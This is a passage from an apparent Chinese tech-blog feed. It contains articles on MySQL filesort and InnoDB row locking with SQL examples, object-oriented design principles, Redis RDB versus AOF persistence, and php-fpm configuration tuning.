type: index

possible_keys: NULL

key: name

key_len: 18

ref: NULL

rows: 4

Extra: Using index

1 row in set (0.00 sec)</code></pre><p>当MySQL不能使用索引进行排序时，就会利用自己的排序算法(快速排序算法)在内存(sort buffer)中对数据进行排序，如果内存装载不下，它会将磁盘上的数据进行分块，再对各个数据块进行排序，然后将各个块合并成有序的结果集（实际上就是外排序）。对于filesort，MySQL有两种排序算法。</p>
<p><strong>(1)两遍扫描算法(Two passes)</strong></p>
<p>实现方式是先将须要排序的字段和可以直接定位到相关行数据的指针信息取出，然后在设定的内存（通过参数sort_buffer_size设定）中进行排序，完成排序之后再次通过行指针信息取出所需的Columns。</p>
<p>注：该算法是4.1之前采用的算法，它需要两次访问数据，尤其是第二次读取操作会导致大量的随机I/O操作。另一方面，内存开销较小。</p>
<p><strong>(2)一次扫描算法(single pass)</strong></p>
<p>该算法一次性将所需的Columns全部取出，在内存中排序后直接将结果输出。</p>
<p>注：从 MySQL 4.1 版本开始使用该算法。它减少了I/O的次数，效率较高，但是内存开销也较大。如果我们将并不需要的Columns也取出来，就会极大地浪费排序过程所需要的内存。在 MySQL 4.1 之后的版本中，可以通过设置 max_length_for_sort_data 参数来控制 MySQL 选择第一种排序算法还是第二种。当取出的所有大字段总大小大于 max_length_for_sort_data 的设置时，MySQL 就会选择使用第一种排序算法，反之，则会选择第二种。为了尽可能地提高排序性能，我们自然更希望使用第二种排序算法，所以在 Query 中仅仅取出需要的 Columns 是非常有必要的。</p>
<p>当对连接操作进行排序时，如果ORDER BY仅仅引用第一个表的列，MySQL对该表进行filesort操作，然后进行连接处理，此时，EXPLAIN输出“Using filesort”；否则，MySQL必须将查询的结果集生成一个临时表，在连接完成之后进行filesort操作，此时，EXPLAIN输出“Using temporary;Using filesort”。</p>
<h3 id="索引与加锁"><a href="#索引与加锁" class="headerlink" title="索引与加锁"></a>索引与加锁</h3><p>索引对于InnoDB非常重要，因为它可以让查询锁更少的元组。这点十分重要，因为MySQL 5.0中，InnoDB直到事务提交时才会解锁。有两个方面的原因：</p>
<ul>
<li><p>首先，即使InnoDB行级锁的开销非常高效，内存开销也较小，但不管怎么样，还是存在开销。</p>
</li>
<li><p>其次，对不需要的元组的加锁，会增加锁的开销，降低并发性。</p>
</li>
</ul>
<p>InnoDB仅对需要访问的元组加锁，而索引能够减少InnoDB访问的元组数。但是，只有在存储引擎层过滤掉那些不需要的数据才能达到这种目的。一旦索引不允许InnoDB那样做（即达不到过滤的目的），MySQL服务器只能对InnoDB返回的数据进行WHERE操作，此时，已经无法避免对那些元组加锁了：InnoDB已经锁住那些元组，服务器无法解锁了。</p>
<p>来看个例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> actor(</span><br><span class="line">    actor_id        <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    <span class="keyword">name</span>            <span class="built_in">varchar</span>(<span class="number">16</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">    <span class="keyword">password</span>        <span class="built_in">varchar</span>(<span class="number">16</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span>(actor_id),</span><br><span class="line">    <span class="keyword">KEY</span>     (<span class="keyword">name</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> actor(<span class="keyword">name</span>,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'cat01'</span>,<span class="string">'1234567'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> actor(<span class="keyword">name</span>,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'cat02'</span>,<span class="string">'1234567'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> actor(<span class="keyword">name</span>,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'ddddd'</span>,<span class="string">'1234567'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> actor(<span class="keyword">name</span>,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'aaaaa'</span>,<span class="string">'1234567'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> AUTOCOMMIT=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">SELECT</span> actor_id <span class="keyword">FROM</span> actor <span class="keyword">WHERE</span> actor_id &lt; <span class="number">4</span></span><br><span class="line"><span class="keyword">AND</span> actor_id &lt;&gt; <span class="number">1</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</span><br></pre></td></tr></table></figure>

<p>该查询仅仅返回2—3的数据，实际已经对1—3的数据加上排它锁了。InnoDB锁住元组1是因为MySQL的查询计划仅使用索引进行范围查询（而没有进行过滤操作，WHERE中第二个条件已经无法使用索引了）：</p>
<pre><code>mysql&gt; EXPLAIN SELECT actor_id FROM test.actor where actor_id &lt; 4 and actor_id &lt;&gt; 1 for update \G

*************************** 1. row ***************************

id: 1

select_type: SIMPLE

table: actor

type: index

possible_keys: PRIMARY

key: PRIMARY

key_len: 4

ref: NULL

rows: 4

Extra: Using where; Using index

1 row in set (0.00 sec)

mysql&gt;</code></pre><p>表明存储引擎从索引的起始处开始，获取所有的行，直到actor_id&lt;4为假，服务器无法告诉InnoDB去掉元组1。</p>
<p>为了证明row 1已经被锁住，我们另外建一个连接，执行如下操作：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> AUTOCOMMIT=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> actor_id <span class="keyword">FROM</span> actor <span class="keyword">WHERE</span> actor_id = <span class="number">1</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</span><br></pre></td></tr></table></figure>

<p>该查询会被挂起，直到第一个连接的事务提交释放锁时，才会执行（这种行为对于基于语句的复制(statement-based replication)是必要的）。</p>
<p>如上所示，当使用索引时，InnoDB会锁住它不需要的元组。更糟糕的是，如果查询不能使用索引，MySQL会进行全表扫描，并锁住每一个元组，不管是否真正需要。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>什么是OOP</title>
    <url>/articles/%E4%BB%80%E4%B9%88%E6%98%AFOOP/</url>
    <content><![CDATA[<p>面向对象是相对于面向过程而言的。面向过程语言是一种基于功能分析的、以算法为中心的程序设计方法；而面向对象是一种基于结构分析的、以数据为中心的程序设计思想。早在面向过程语言时代，有一句话说：<strong>程序=算法+数据结构</strong>。而现在在面向对象语言时代，这句话变为：<strong>程序= 对象+消息</strong>。对象：万物皆对象； <strong>消息</strong>：指对象之间的相互通信。在面向对象语言中有一个有很重要东西，叫做<strong>类</strong>。从面向过程的角度看，类就是一个特殊的数据结构，它就好像是我们C语言中的结构体;从面向对象的角度看，<strong>类就是具有相同属性和方法的对象的集合</strong>。</p>
<p>面向对象有三大特性：<em>封装</em>、<em>继承</em>、<em>多态</em>。</p>
<p><strong>封装</strong></p>
<p>所谓<em>封装</em>,就是指隐藏对象的实现细节，给外界提供公共的方法来访问。</p>
<p>这一点，我个人认为和面向过程语言有本质的区别。在C语言中，我们必须在乎每一个实现细节，去关注每一个过程； 而自从从在面向对象语言中提出了封装这个概念后，我们就可以不必要去关心每一个对象的实现细节，  我们只要关注我们所要实现的功能就行，然后根据给我们提供好的接口，我们去面向接口编程就行了。</p>
<p>面向对象的封装思想，我认为应用的最好、最成功的地方，就是在微软的.NET技术上.微软把很多经常用到的功能都封装在一个控件里，作为我们用户不必去在意到底这个控件是用什么实现的，它内部到底是怎么样的？我们只需要关心我们需要实现的功能就行， 然后根据控件给我们提供的属性和方法去操作这些控件，实现我们想要的功能就行了。</p>
<p><strong>继承</strong></p>
<p>面向对象的继承和生物学的继承很相似。子类可以继承父类的公共属性和方法，子类永远没法继承到父类的私有属性和方法。这一点还区别于生物学的继承，生物学中子类可以同时继承父亲和母亲。但是在 <em>java|C#|C++</em> 等面向对象语言中，是不允许多重继承的，但可以多层继承。</p>
<p>为了弥补不能多重继承这点，在java和c#语言中都提出了接口这一概念。接口就是一种规范。它同样不会有实现细节，而只是给那些要实现这个接口的类一个规范和约束，约束那些实现这些接口的类，要实现我提供的功能，就必须实现我的所有方法， 要不你就声明为抽象类。</p>
<p><strong>多态</strong></p>
<p>多态，就是同一个实现接口，对不同的实例而执行不同的操作。这一点，可以理解为遗传学的变异。  同一个物种的后代由于基因突变或自然环境等影响，而造成不同的个体差异。而我们这里的多态也一样，同属一个基类的不同派生类也可以有自己不同于其他类的属性和方法。</p>
<blockquote>
<p>除了这封装、继承、多态这三点基本特征外，面向对象还有一个很重要的概念，叫<strong>抽象</strong>。抽象就是把提取事物的本质东西，而忽视非本质的东西。对应于抽象这一概念，java和c#中都有一个类叫做抽象类。抽象类中可以给出方法的实现细节，同接口一样如果你要实现我这个抽象类就必须实现我的所有方法，要不你就声明你为抽象类。如果不允许抽象类中有方法的实现细节，这就变成了接口。</p>
</blockquote>
<p>总之，面向对象就是万物皆对象，把客观事物当成一个对象来处理的程序设计思想。是一种区别于POP、SOA、面向组件等其他程序设计思想，是一种基于结构分析的，以数据为中心的程序设计思想。</p>
<p>OOP几大设计模式遵循的一般原则：</p>
<p><strong>1.开-闭原则(Open-Closed Principle, OCP)</strong></p>
<p>一个软件实体应当对扩展开发,对修改关闭.说的是,再设计一个模块的时候,应当使这个模块可以在不被修改的前提下被扩展.换言之,应当可以在不必修改源代码的情况下改变这个模块的行为，在保持系统一定稳定性的基础上，对系统进行扩展。这是面向对象设计（OOD）的基石，也是最重要的原则。</p>
<p><strong>2.里氏代换原则(Liskov Substitution Principle,常缩写为.LSP)</strong></p>
<ul>
<li><p>由Barbar Liskov(芭芭拉.里氏)提出，是继承复用的基石。</p>
</li>
<li><p>严格表达:如果每一个类型为T1的对象o1,都有类型为T2的对象o2,使得以T1定义的所有程序P在所有的对象o1都代换称o2时,程序P的行为没有变化,那么类型T2是类型T1的子类型.</p>
</li>
</ul>
<p>换言之,一个软件实体如果使用的是一个基类的话,那么一定适用于其子类,而且它根本不能察觉出基类对象和子类对象的区别.只有衍生类可以替换基类，软件单位的功能才能不受影响，基类才能真正被复用，而衍生类也能够在基类的基础上增加新功能。</p>
<ul>
<li><p>反过来的代换不成立</p>
</li>
<li><p>&lt;墨子.小取&gt;中说:”白马,马也; 乘白马,乘马也.骊马(黑马),马也;乘骊马,乘马也.”</p>
</li>
<li><p>该类西方著名的例程为:正方形是否是长方形的子类(答案是”否”)。类似的还有椭圆和圆的关系。</p>
</li>
<li><p>应当尽量从抽象类继承,而不从具体类继承,一般而言,如果有两个具体类A,B有继承关系,那么一个最简单的修改方案是建立一个抽象类C,然后让类A和B成为抽象类C的子类.即如果有一个由继承关系形成的登记结构的话,那么在等级结构的树形图上面所有的树叶节点都应当是具体类;而所有的树枝节点都应当是抽象类或者接口.</p>
</li>
<li><p>“基于契约设计(Design By Constract),简称DBC”这项技术对LISKOV代换原则提供了支持.该项技术Bertrand Meyer伯特兰做过详细的介绍:  使用DBC,类的编写者显式地规定针对该类的契约.客户代码的编写者可以通过该契约获悉可以依赖的行为方式.契约是通过每个方法声明的前置条件(preconditions)和后置条件(postconditions)来指定的.要使一个方法得以执行,前置条件必须为真.执行完毕后,该方法要保证后置条件为真.就是说,在重新声明派生类中的例程(routine)时,只能使用相等或者更弱的前置条件来替换原始的前置条件,只能使用相等或者更强的后置条件来替换原始的后置条件.</p>
</li>
</ul>
<p><strong>3.依赖倒置原则(Dependence Inversion Principle)</strong></p>
<p>要求客户端依赖于抽象耦合.</p>
<ul>
<li><p>表述: 抽象不应当依赖于细节,细节应当依赖于抽象.(Program to an interface, not an implementaction)</p>
</li>
<li><p>表述二: 针对接口编程的意思是说,应当使用接口和抽象类进行变量的类型声明,参量的类型声明,方法的返还类型声明,以及数据类型的转换等.不要针对实现编程的意思就是说,不应当使用具体类进行变量的类型声明,参量类型声明,方法的返还类型声明,以及数据类型的转换等.要保证做到这一点,一个具体的类应等只实现接口和抽象类中声明过的方法,而不应当给出多余的方法.只要一个被引用的对象存在抽象类型,就应当在任何引用此对象的地方使用抽象类型,包括参量的类型声明,方法返还类型的声明,属性变量的类型声明等.</p>
</li>
<li><p>接口与抽象的区别就在于抽象类可以提供某些方法的部分实现,而接口则不可以,这也大概是抽象类唯一的优点.如果向一个抽象类加入一个新的具体方法,那么所有的子类型一下子就都得到得到了这个新的具体方法,而接口做不到这一点.如果向一个接口加入了一个新的方法的话,所有实现这个接口的类就全部不能通过编译了,因为它们都没有实现这个新声明的方法.这显然是接口的一个缺点.</p>
</li>
<li><p>一个抽象类的实现只能由这个抽象类的子类给出,也就是说,这个实现处在抽象类所定义出的继承的登记结构中,而由于一般语言都限制一个类只能从最多一个超类继承,因此将抽象作为类型定义工具的效能大打折扣.<br>反过来,看接口,就会发现任何一个实现了一个接口所规定的方法的类都可以具有这个接口的类型,而一个类可以实现任意多个接口.</p>
</li>
<li><p>从代码重构的角度上讲,将一个单独的具体类重构成一个接口的实现是很容易的,只需要声明一个接口,并将重要的方法添加到接口声明中,然后在具体类定义语句中加上保留字以继承于该接口就行了.而作为一个已有的具体类添加一个抽象类作为抽象类型不那么容易,因为这个具体类有可能已经有一个超类.这样一来,这个新定义的抽象类只好继续向上移动,变成这个超类的超类,如此循环,最后这个新的抽象类必定处于整个类型等级结构的最上端,从而使登记结构中的所有成员都会受到影响.</p>
</li>
<li><p>接口是定义混合类型的理想工具,所为混合类型,就是在一个类的主类型之外的次要类型.一个混合类型表明一个类不仅仅具有某个主类型的行为,而且具有其他的次要行为.</p>
</li>
<li><p>联合使用接口和抽象类:由于抽象类具有提供缺省实现的优点,而接口具有其他所有优点,所以联合使用两者就是一个很好的选择. 首先,声明类型的工作仍然接口承担的,但是同时给出的还有一个抽象类,为这个接口给出一个缺省实现.其他同属于这个抽象类型的具体类可以选择实现这个接口,也可以选择继承自这个抽象类.如果一个具体类直接实现这个接口的话,它就必须自行实现所有的接口;相反,如果它继承自抽象类的话,它可以省去一些不必要的的方法,因为它可以从抽象类中自动得到这些方法的缺省实现;如果需要向接口加入一个新的方法的话,那么只要同时向这个抽象类加入这个方法的一个具体实现就可以了,因为所有继承自这个抽象类的子类都会从这个抽象类得到这个具体方法.这其实就是缺省适配器模式(Defaule Adapter).</p>
</li>
<li><p>什么是高层策略呢?它是应用背后的抽象,是那些不随具体细节的改变而改变的真理. 它是系统内部的隐喻.</p>
</li>
</ul>
<p><strong>4.接口隔离原则</strong></p>
<p>(Interface Segregation Principle, ISP)</p>
<ul>
<li><p>一个类对另外一个类的依赖是建立在最小的接口上。</p>
</li>
<li><p>使用多个专门的接口比使用单一的总接口要好.根据客户需要的不同,而为不同的客户端提供不同的服务是一种应当得到鼓励的做法.就像”看人下菜碟”一样,要看客人是谁,再提供不同档次的饭菜.</p>
</li>
<li><p>胖接口会导致他们的客户程序之间产生不正常的并且有害的耦合关系.当一个客户程序要求该胖接口进行一个改动时,会影响到所有其他的客户程序.因此客户程序应该仅仅依赖他们实际需要调用的方法.</p>
</li>
</ul>
<p><strong>5.合成/聚合复用原则(Composite/Aggregate Reuse Principle,CARP)</strong></p>
<p>在一个新的对象里面使用一些已有的对象,使之成为新对象的一部分;新的对象通过这些向对象的委派达到复用已有功能的目的.这个设计原则有另一个简短的表述:要尽量使用合成/聚合,尽量不要使用继承.</p>
<p><strong>6.迪米特法则(Law of Demeter LoD)又叫做最少知识原则(Least Knowledge Principle,LKP)</strong></p>
<p>就是说,一个对象应当对其他对象有尽可能少的了了解.</p>
<p>迪米特法则最初是用来作为面向对象的系统设计风格的一种法则,与1987年秋天由Ian Holland在美国东北大学为一个叫做迪米特(Demeter)的项目设计提出的,因此叫做迪米特法则[LIEB89][LIEB86].这条法则实际上是很多著名系统,比如火星登陆软件系统,木星的欧罗巴卫星轨道飞船的软件系统的指导设计原则.</p>
<p>没有任何一个其他的OO设计原则象迪米特法则这样有如此之多的表述方式,如下几种:</p>
<ul>
<li><p>只与你直接的朋友们通信(Only talk to your immediate friends)</p>
</li>
<li><p>不要跟”陌生人”说话(Don’t talk to strangers)</p>
</li>
<li><p>每一个软件单位对其他的单位都只有最少的知识,而且局限于那些本单位密切相关的软件单位.</p>
</li>
</ul>
<p>就是说,如果两个类不必彼此直接通信,那么这两个类就不应当发生直接的相互作用,如果其中的一个类需要调用另一个类的某一个方法的话,可以通过第三者转发这个调用。</p>
<p><strong>7.单一职责原则(Simple responsibility pinciple SRP)</strong></p>
<p>就一个类而言,应该仅有一个引起它变化的原因,如果你能想到多于一个的动机去改变一个类,那么这个类就具有多于一个的职责.应该把多于的指责分离出去,分别再创建一些类来完成每一个职责.</p>
<p>常说的OO五大原则就是指其中的 ：</p>
<pre><code>1、单一职责原则；

2、开放闭合原则；

3、里氏替换原则；

4、依赖倒置原则；

5、接口隔离原则。</code></pre>]]></content>
  </entry>
  <entry>
    <title>redis持久化</title>
    <url>/articles/redis%E6%8C%81%E4%B9%85%E5%8C%96/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Redis是一种高级key-value数据库。它跟memcached类似，不过数据可以持久化，而且支持的数据类型很丰富。有字符串，链表，集 合和有序集合。支持在服务器端计算集合的并，交和补集(difference)等，还支持多种排序功能。所以Redis也可以被看成是一个数据结构服务 器。<br>Redis的所有数据都是保存在内存中，然后不定期的通过异步方式保存到磁盘上(这称为“半持久化模式”)；也可以把每一次数据变化都写入到一个append only file(aof)里面(这称为“全持久化模式”)。 </p>
<p>由于Redis的数据都存放在内存中，如果没有配置持久化，redis重启后数据就全丢失了，于是需要开启redis的持久化功能，将数据保存到磁 盘上，当redis重启后，可以从磁盘中恢复数据。redis提供两种方式进行持久化，一种是RDB持久化（原理是将Reids在内存中的数据库记录定时 dump到磁盘上的RDB持久化），另外一种是AOF（append only file）持久化（原理是将Reids的操作日志以追加的方式写入文件）。那么这两种持久化方式有什么区别呢，改如何选择呢？网上看了大多数都是介绍这两 种方式怎么配置，怎么使用，就是没有介绍二者的区别，在什么应用场景下使用。</p>
<h3 id="二者的区别"><a href="#二者的区别" class="headerlink" title="二者的区别"></a>二者的区别</h3><p>RDB持久化是指在指定的时间间隔内将内存中的数据集快照写入磁盘，实际操作过程是fork一个子进程，先将数据集写入临时文件，写入成功后，再替换之前的文件，用二进制压缩存储。</p>
<p><img src="/articles/redis持久化/202045454552.png" alt="RDB持久化"></p>
<p>AOF持久化以日志的形式记录服务器所处理的每一个写、删除操作，查询操作不会记录，以文本的方式记录，可以打开文件看到详细的操作记录。</p>
<p><img src="/articles/redis持久化/371688235.png" alt="AOF持久化"> </p>
<h3 id="二者优缺点"><a href="#二者优缺点" class="headerlink" title="二者优缺点"></a>二者优缺点</h3><h4 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h4><ul>
<li>优势</li>
</ul>
<p>1). 一旦采用该方式，那么你的整个Redis数据库将只包含一个文件，这对于文件备份而言是非常完美的。比如，你可能打算每个小时归档一次最近24小时的数 据，同时还要每天归档一次最近30天的数据。通过这样的备份策略，一旦系统出现灾难性故障，我们可以非常容易的进行恢复。</p>
<p>2). 对于灾难恢复而言，RDB是非常不错的选择。因为我们可以非常轻松的将一个单独的文件压缩后再转移到其它存储介质上。</p>
<p>3). 性能最大化。对于Redis的服务进程而言，在开始持久化时，它唯一需要做的只是fork出子进程，之后再由子进程完成这些持久化的工作，这样就可以极大的避免服务进程执行IO操作了。</p>
<p>4). 相比于AOF机制，如果数据集很大，RDB的启动效率会更高。</p>
<ul>
<li>劣势</li>
</ul>
<p>1). 如果你想保证数据的高可用性，即最大限度的避免数据丢失，那么RDB将不是一个很好的选择。因为系统一旦在定时持久化之前出现宕机现象，此前没有来得及写入磁盘的数据都将丢失。</p>
<p>2). 由于RDB是通过fork子进程来协助完成数据持久化工作的，因此，如果当数据集较大时，可能会导致整个服务器停止服务几百毫秒，甚至是1秒钟。</p>
<h4 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h4><ul>
<li>优势</li>
</ul>
<p>1). 该机制可以带来更高的数据安全性，即数据持久性。Redis中提供了3中同步策略，即每秒同步、每修改同步和不同步。事实上，每秒同步也是异步完成的，其 效率也是非常高的，所差的是一旦系统出现宕机现象，那么这一秒钟之内修改的数据将会丢失。而每修改同步，我们可以将其视为同步持久化，即每次发生的数据变 化都会被立即记录到磁盘中。可以预见，这种方式在效率上是最低的。至于无同步，无需多言，我想大家都能正确的理解它。</p>
<p>2). 由于该机制对日志文件的写入操作采用的是append模式，因此在写入过程中即使出现宕机现象，也不会破坏日志文件中已经存在的内容。然而如果我们本次操 作只是写入了一半数据就出现了系统崩溃问题，不用担心，在Redis下一次启动之前，我们可以通过redis-check-aof工具来帮助我们解决数据 一致性的问题。</p>
<p>3). 如果日志过大，Redis可以自动启用rewrite机制。即Redis以append模式不断的将修改数据写入到老的磁盘文件中，同时Redis还会创 建一个新的文件用于记录此期间有哪些修改命令被执行。因此在进行rewrite切换时可以更好的保证数据安全性。</p>
<p>4). AOF包含一个格式清晰、易于理解的日志文件用于记录所有的修改操作。事实上，我们也可以通过该文件完成数据的重建。</p>
<ul>
<li>劣势</li>
</ul>
<p>1). 对于相同数量的数据集而言，AOF文件通常要大于RDB文件。RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。</p>
<p>2). 根据同步策略的不同，AOF在运行效率上往往会慢于RDB。总之，每秒同步策略的效率是比较高的，同步禁用策略的效率和RDB一样高效。</p>
<p>二者选择的标准，就是看系统是愿意牺牲一些性能，换取更高的缓存一致性（aof），还是愿意写操作频繁的时候，不启用备份来换取更高的性能，待手动运行save的时候，再做备份（rdb）。rdb这个就更有些 eventually consistent的意思了。</p>
<h3 id="常用配置"><a href="#常用配置" class="headerlink" title="常用配置"></a>常用配置</h3><ul>
<li>RDB持久化配置</li>
</ul>
<p>Redis会将数据集的快照dump到dump.rdb文件中。此外，我们也可以通过配置文件来修改Redis服务器dump快照的频率，在打开6379.conf文件之后，我们搜索save，可以看到下面的配置信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">save 900 1             # 在900秒(15分钟)之后，如果至少有1个key发生变化，则dump内存快照。</span><br><span class="line"></span><br><span class="line">save 300 10            # 在300秒(5分钟)之后，如果至少有10个key发生变化，则dump内存快照。</span><br><span class="line"></span><br><span class="line">save 60 10000          # 在60秒(1分钟)之后，如果至少有10000个key发生变化，则dump内存快照。</span><br></pre></td></tr></table></figure>

<ul>
<li>AOF持久化配置</li>
</ul>
<p>在Redis的配置文件中存在三种同步方式，它们分别是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">appendfsync always      # 每次有数据修改发生时都会写入AOF文件。</span><br><span class="line"></span><br><span class="line">appendfsync everysec    # 每秒钟同步一次，该策略为AOF的缺省策略。</span><br><span class="line"></span><br><span class="line">appendfsync no          # 从不同步。高效但是数据不会被持久化。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>优化你的php-fpm(php5.3+）让你的网站跑得更快</title>
    <url>/articles/%E4%BC%98%E5%8C%96%E4%BD%A0%E7%9A%84php-fpm-php5-3-%EF%BC%89%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B7%91%E5%BE%97%E6%9B%B4%E5%BF%AB/</url>
    <content><![CDATA[<p>从php5.3以后php自带了php-fpm不是和php5.2一样以插件的方式存在了。这给我们带来一个好处502没有那么容易出现了,用linux的绝大多数应该还是在用小军的lnmp的那个包，但是配置优化却是不尽人意。</p>
<p>php-fpm的配置文件位置： /usr/local/php/etc/php-fpm.conf</p>
<blockquote>
<p>   pid = run/php-fpm.pid</p>
</blockquote>
<p>pid设置，默认在安装目录中的var/run/php-fpm.pid，建议开启</p>
<blockquote>
<p>   error_log = log/php-fpm.log</p>
</blockquote>
<p>错误日志，默认在安装目录中的var/log/php-fpm.log</p>
<blockquote>
<p>   log_level = notice</p>
</blockquote>
<p>错误级别. 可用级别为: alert（必须立即处理）, error（错误情况）, warning（警告情况）, notice（一般重要信息）, debug（调试信息）. 默认: notice.</p>
<blockquote>
<p>  emergency_restart_threshold = 60</p>
<p>  emergency_restart_interval = 60s</p>
</blockquote>
<p>表示在emergency_restart_interval所设值内出现SIGSEGV或者SIGBUS错误的php-cgi进程数如果超过 emergency_restart_threshold个，php-fpm就会优雅重启。这两个选项一般保持默认值。</p>
<blockquote>
<p>   process_control_timeout = 0</p>
</blockquote>
<p>设置子进程接受主进程复用信号的超时时间. 可用单位: s(秒), m(分), h(小时), 或者 d(天) 默认单位: s(秒). 默认值: 0.</p>
<blockquote>
<p>   daemonize = yes</p>
</blockquote>
<p>后台执行fpm,默认值为yes，如果为了调试可以改为no。</p>
<p>在FPM中，可以使用不同的设置来运行多个进程池。 这些设置可以针对每个进程池单独设置。</p>
<blockquote>
<p>   listen = 127.0.0.1:9000</p>
</blockquote>
<p>fpm监听端口，即nginx中php处理的地址，一般默认值即可。</p>
<p>可用格式为: <em>ip:port</em>, <em>port</em>, <em>/path/to/unix/socket</em>. 每个进程池都需要设置.</p>
<blockquote>
<p>   listen.backlog = -1</p>
</blockquote>
<p>backlog数，-1表示无限制，由操作系统决定，此行注释掉就行。backlog含义参考：</p>
<blockquote>
<p>   listen.allowed_clients = 127.0.0.1</p>
</blockquote>
<p>允许访问FastCGI进程的IP，设置any为不限制IP，如果要设置其他主机的nginx也能访问这台FPM进程，listen处要设置成本地可被访问的IP。默认值是any。</p>
<p>每个地址是用逗号分隔. 如果没有设置或者为空，则允许任何服务器请求连接</p>
<blockquote>
<p>   listen.owner = www</p>
<p>   listen.group = www</p>
<p>   listen.mode = 0666</p>
</blockquote>
<p>unix socket设置选项，如果使用tcp方式访问，这里注释即可。</p>
<blockquote>
<p>   user = www</p>
<p>   group = www</p>
</blockquote>
<p>启动进程的帐户和组</p>
<blockquote>
<p>   pm = dynamic</p>
</blockquote>
<p>pm表示使用那种方式，有两个值可以选择，就是static（静态模式）或者dynamic（动态模式5.2的时候叫apache-like但是不好使）</p>
<p>如果选择static，则由pm.max_children指定固定的子进程数。</p>
<p>如果选择dynamic，则由下开参数决定：</p>
<blockquote>
<p>   pm.max_children ，子进程最大数</p>
<p>   pm.start_servers ，启动时的进程数</p>
<p>   pm.min_spare_servers ，保证空闲进程数最小值，如果空闲进程小于此值，则创建新的子进程</p>
<p>   pm.max_spare_servers ，保证空闲进程数最大值，如果空闲进程大于此值，此进行清理</p>
</blockquote>
<p>对于专用服务器，pm可以设置为static。</p>
<blockquote>
<p>  pm.max_requests = 1000</p>
</blockquote>
<p>设置每个子进程重生之前服务的请求数. 对于可能存在内存泄漏的第三方模块来说是非常有用的. 如果设置为 ‘0′ 则一直接受请求. 等同于 PHP_FCGI_MAX_REQUESTS 环境变量. 默认值: 0.</p>
<blockquote>
<p>   pm.status_path = /status</p>
</blockquote>
<p>FPM状态页面的网址. 如果没有设置, 则无法访问状态页面. 默认值: none.</p>
<blockquote>
<p>   ping.path = /ping</p>
</blockquote>
<p>FPM监控页面的ping网址. 如果没有设置, 则无法访问ping页面. 该页面用于外部检测FPM是否存活并且可以响应请求. 请注意必须以斜线开头 (/)。</p>
<blockquote>
<p>   ping.response = pong</p>
</blockquote>
<p>用于定义ping请求的返回相应. 返回为 HTTP 200 的 text/plain 格式文本. 默认值: pong.</p>
<blockquote>
<p>   request_terminate_timeout = 0</p>
</blockquote>
<p>设置单个请求的超时中止时间. 该选项可能会对php.ini设置中的’max_execution_time’因为某些特殊原因没有中止运行的脚本有用. 设置为 ‘0′ 表示 ‘Off’.</p>
<p>当经常出现502错误时可以尝试更改此选项。</p>
<blockquote>
<p>   request_slowlog_timeout = 10s</p>
</blockquote>
<p>当一个请求该设置的超时时间后，就会将对应的PHP调用堆栈信息完整写入到慢日志中. 设置为 ‘0′ 表示 ‘Off’</p>
<blockquote>
<p>  slowlog = log/$pool.log.slow</p>
</blockquote>
<p>慢请求的记录日志,配合request_slowlog_timeout使用</p>
<blockquote>
<p>   rlimit_files = 1024</p>
</blockquote>
<p>设置文件打开描述符的rlimit限制. 默认值: 系统定义值</p>
<p>系统默认可打开句柄是1024，可使用 ulimit -n查看，ulimit -n 2048修改。</p>
<blockquote>
<p>   rlimit_core = 0</p>
</blockquote>
<p>设置核心rlimit最大限制值. 可用值: ‘unlimited’ 、0或者正整数. 默认值: 系统定义值.</p>
<blockquote>
<p>  chroot =</p>
</blockquote>
<p>启动时的Chroot目录. 所定义的目录需要是绝对路径. 如果没有设置, 则chroot不被使用.</p>
<blockquote>
<p>   chdir =</p>
</blockquote>
<p>设置启动目录，启动时会自动Chdir到该目录. 所定义的目录需要是绝对路径. 默认值: 当前目录，或者/目录（chroot时）</p>
<blockquote>
<p>   catch_workers_output = yes</p>
</blockquote>
<p>重定向运行过程中的stdout和stderr到主要的错误日志文件中. 如果没有设置, stdout 和 stderr 将会根据FastCGI的规则被重定向到 /dev/null . 默认值: 空</p>
<p>下面已我的php配置例子：</p>
